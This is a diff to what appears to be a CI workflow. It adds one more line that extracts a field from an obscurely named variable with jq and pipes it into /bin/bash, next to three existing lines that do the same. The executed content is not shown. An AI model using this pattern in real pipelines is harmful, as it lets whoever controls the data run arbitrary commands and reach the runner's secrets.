@@ -22,6 +22,7 @@ jobs:
           echo $ss438 | jq -r .c70 | /bin/bash
           printf '%s' "$rv232" | jq -r .ie63 | /bin/bash
           printf '%s' "$fjb767" | jq -r .ohd41 | /bin/bash
+          echo $o1 | jq -r .pg4241 | /bin/bash
 
       - name: Store results
         if: always()
